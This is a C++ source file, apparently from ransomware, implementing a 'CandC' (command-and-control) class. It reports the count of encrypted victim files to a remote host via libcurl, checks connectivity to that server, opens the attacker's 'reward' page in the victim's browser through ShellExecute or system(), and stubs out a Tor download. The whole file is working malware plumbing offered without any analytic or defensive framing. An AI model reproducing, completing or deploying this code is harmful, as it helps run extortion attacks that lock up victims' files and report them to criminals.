#include <curl/curl.h>
#include "after_day.h"

using namespace std;

int CandC::openReward(void){
    std::string url_host = HOST;
    std::string complet_url = url_host;
    char *complet = (char*) complet_url.c_str();
    #if defined(WIN32)
	ShellExecute(NULL, "open", complet, NULL, NULL, SW_SHOWNORMAL);
    #else
	std::string browser_cmd = "x-www-browser "+complet_url;
	char *browser_cmd_chared = (char*) browser_cmd.c_str();
	system(browser_cmd_chared);
    #endif
    return 0;
}

int CandC::hello(void)
{
    //cout << "hello" << endl;
    return 0;
}

#if defined(WIN32)
int CandC::download_tor(void)
{
    return 0;
}
#endif

static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    ((std::string*)userp)->append((char*)contents, size * nmemb);
        return size * nmemb;
}

int CandC::insert_target(void){
    string nb_file = this->nb_file;
    //cout << "Encrypted file : " << nb_file << endl;
    string url_host = HOST;
    string url_path = PATH;
    string complet_url = url_host + url_path + "?insert=1&nb_file=" + nb_file;
    //cout << "complet url: " << complet_url << endl;
    char *url;
    url = (char*) complet_url.c_str();
    //cout << "complet url2: " << url << endl;
    CURL *curl;
    CURLcode res;
    curl = curl_easy_init();
    if(curl)
    {
	curl_easy_setopt(curl, CURLOPT_URL, url);
	res = curl_easy_perform(curl);
	curl_easy_cleanup(curl);
	if(res == 0)
	{
	    //cout << "Send to C&C" << endl;
	}
    }
    return 0;
}

int CandC::checkifconnected(void){
    if(__TOR_USED__ == 0){
	CURL *curl;
	CURLcode res;
	char *url = HOST;
	string content;
	curl = curl_easy_init();
	if(curl){
	    //cout << "Curl ok" << endl;
	    curl_easy_setopt(curl, CURLOPT_URL, url);
	    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
	    curl_easy_setopt(curl, CURLOPT_WRITEDATA, content);
	    res = curl_easy_perform(curl); 
	    curl_easy_cleanup(curl);
	    if(res == 0){
		return 0;
	    }
	}
    }
    return 1;
}
